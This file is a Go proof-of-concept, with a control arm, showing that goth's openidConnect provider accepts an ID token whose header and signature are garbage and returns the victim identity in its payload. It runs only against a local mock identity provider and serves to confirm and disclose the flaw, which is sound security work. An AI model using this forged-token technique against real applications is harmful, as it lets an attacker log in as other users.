// PoC: goth openidConnect accepts an ID token whose signature is never verified.
//
// The attacker path the finding names: the token endpoint response is
// attacker-controlled (e.g. an IdP configured with an http:// token_endpoint).
// The forged id_token is
//   x.<base64url payload>.x
// i.e. a garbage header and a garbage signature segment. The consumer flow is
// the one goth documents: openidConnect.New (discovery) -> BeginAuth ->
// Session.Authorize (code exchange against the token endpoint) ->
// Provider.FetchUser, exactly what gothic.CompleteUserAuth does.
//
// FetchUser -> decodeJWT (providers/openidConnect/openidConnect.go:516)
// discards the header and signature segments, decodes only the payload, and
// validateClaims only checks aud/iss/exp -- all of which the forger sets freely
// (client key and issuer are non-secret). FetchUser returns a goth.User for
// the victim identity carried by the forged token. No JWKS is ever fetched.
//
// Control arm: same setup, but the id_token returned by the token endpoint is
// a genuinely, correctly signed ES256 token (the condition the finding blames
// -- a forged/unverifiable signature -- is dropped). A real verifier
// (golang-jwt) accepts that token, so no signature forgery occurred and the
// claimed effect (a forged token being accepted) is absent.
package main

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/golang-jwt/jwt/v5"
	"github.com/markbates/goth/providers/openidConnect"
)

const (
	clientKey    = "goth-test-client-key"
	clientSecret = "goth-test-client-secret"
	callbackURL  = "http://localhost:3000/auth/openid-connect/callback"
	victimSub    = "victim-user-12345"
	victimEmail  = "victim@example.com"
	victimName   = "Victim User"
)

// b64 encodes rawurl without padding.
func b64(b []byte) string {
	return base64.RawURLEncoding.EncodeToString(b)
}

func victimClaims(issuer string) map[string]interface{} {
	return map[string]interface{}{
		"iss": issuer,
		"aud": clientKey,
		"sub": victimSub,
		"exp": time.Now().Add(time.Hour).Unix(),
		"iat": time.Now().Add(-time.Minute).Unix(),
		"name":    victimName,
		"email":   victimEmail,
		"picture": "http://evil.example/avatar.png",
	}
}

// forgedToken builds the finding's forged ID token: x.<base64 payload>.x
// with garbage header and signature segments.
func forgedToken(issuer string) string {
	pb, _ := json.Marshal(victimClaims(issuer))
	return "x." + b64(pb) + ".x"
}

// realSignedToken builds a properly signed ES256 ID token with the same claims.
func realSignedToken(issuer string, key *ecdsa.PrivateKey) (string, error) {
	tok := jwt.NewWithClaims(jwt.SigningMethodES256, jwt.MapClaims(victimClaims(issuer)))
	return tok.SignedString(key)
}

func main() {
	mode := "baseline"
	if len(os.Args) > 1 {
		mode = os.Args[1]
	}

	// The "IdP": its discovery document and token endpoint responses are what
	// an attacker in the finding's position controls.
	idpServer := httptest.NewServer(http.NotFoundHandler())
	defer idpServer.Close()
	issuer := idpServer.URL

	var idToken string
	var signingKey *ecdsa.PrivateKey // control arm only

	if mode == "baseline" {
		idToken = forgedToken(issuer)
		fmt.Printf("mode=baseline: id_token returned by the token endpoint is FORGED (garbage header and signature): %s\n", idToken)
	} else {
		var err error
		signingKey, err = ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
		if err != nil {
			fmt.Println("control setup failed:", err)
			os.Exit(2)
		}
		idToken, err = realSignedToken(issuer, signingKey)
		if err != nil {
			fmt.Println("control setup failed:", err)
			os.Exit(2)
		}
		fmt.Println("mode=control: id_token returned by the token endpoint is a REAL, correctly signed ES256 token (no forgery)")
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/.well-known/openid-configuration", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{
			"issuer":                                issuer,
			"authorization_endpoint":                issuer + "/auth",
			"token_endpoint":                        issuer + "/token",
			"userinfo_endpoint":                     "", // no userinfo endpoint configured: a legitimate IdP configuration goth supports
			"jwks_uri":                              issuer + "/jwks", // advertised but never fetched by goth
			"end_session_endpoint":                  issuer + "/logout",
			"response_types_supported":              "code",
			"subject_types_supported":                "public",
			"id_token_signing_alg_values_supported": "RS256",
		})
	})
	// The jwks endpoint exists (as a real IdP's would), so the keys needed to
	// verify the ID token are publicly available. goth never fetches it.
	mux.HandleFunc("/jwks", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"keys":[]}`))
	})
	// The attacker-controlled token endpoint response.
	mux.HandleFunc("/token", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"access_token":  "attacker-access-token",
			"token_type":    "Bearer",
			"expires_in":    3600,
			"refresh_token": "attacker-refresh-token",
			"id_token":      idToken,
		})
	})
	mux.HandleFunc("/auth", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})
	idpServer.Config.Handler = mux

	// The consumer: an application configuring the provider exactly as goth
	// documents, via the public API only.
	provider, err := openidConnect.New(clientKey, clientSecret, callbackURL,
		issuer+"/.well-known/openid-configuration", "openid", "email", "profile")
	if err != nil {
		fmt.Println("provider creation failed:", err)
		os.Exit(2)
	}

	// BeginAuth, then the code exchange against the token endpoint, exactly
	// like gothic.CompleteUserAuth does.
	sess, err := provider.BeginAuth("state-123")
	if err != nil {
		fmt.Println("BeginAuth failed:", err)
		os.Exit(2)
	}
	oidcSession := sess.(*openidConnect.Session)

	if _, err := oidcSession.Authorize(provider, url.Values{"code": {"attacker-authorization-code"}}); err != nil {
		fmt.Println("code exchange failed:", err)
		os.Exit(2)
	}
	fmt.Printf("code exchange done: session now carries id_token=%q (from the token endpoint response)\n", oidcSession.IDToken)

	user, err := provider.FetchUser(oidcSession)
	if err != nil {
		fmt.Println("FetchUser failed (token REJECTED):", err)
		fmt.Println("effect absent: the ID token was not accepted")
		os.Exit(1)
	}

	fmt.Println("FetchUser SUCCEEDED on the token from the attacker-controlled token endpoint")
	fmt.Printf("authenticated user: UserID=%q Email=%q Name=%q Provider=%q\n",
		user.UserID, user.Email, user.Name, user.Provider)
	fmt.Printf("RawData: %v\n", user.RawData)

	// Confirm the signature segment of the accepted token.
	parts := strings.Split(oidcSession.IDToken, ".")
	fmt.Printf("accepted token segments: header=%q payload_len=%d signature=%q\n",
		parts[0], len(parts[1]), parts[2])

	if mode == "baseline" {
		if parts[0] != "x" || parts[2] != "x" {
			fmt.Println("effect absent: the accepted token was not the forged one")
			os.Exit(1)
		}
		if user.UserID != victimSub || user.Email != victimEmail {
			fmt.Println("effect absent: FetchUser did not return the victim identity")
			os.Exit(1)
		}
		// Reference check: a real verifier rejects this forged token.
		anyKey, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
		_, refErr := jwt.Parse(oidcSession.IDToken, func(t *jwt.Token) (interface{}, error) {
			return &anyKey.PublicKey, nil
		})
		fmt.Println("reference verifier (golang-jwt) rejects the forged token:", refErr != nil)
		fmt.Println("effect happened: goth.FetchUser accepted an ID token with a garbage (never verified) signature and returned the victim identity")
		os.Exit(0)
	}

	// Control arm: the token that was accepted was genuinely signed by the IdP
	// key; a real verifier with that key accepts it, so the acceptance is not
	// a signature forgery and the claimed effect is absent.
	_, ctrlErr := jwt.Parse(oidcSession.IDToken, func(t *jwt.Token) (interface{}, error) {
		return &signingKey.PublicKey, nil
	})
	fmt.Println("reference verifier (golang-jwt) accepts the control token (it is genuinely signed):", ctrlErr == nil)
	fmt.Println("effect absent: the accepted token was a genuinely signed ID token, not a forged one, so the claimed effect (forged/unverifiable-signature token accepted) did not occur in this arm")
	os.Exit(1)
}
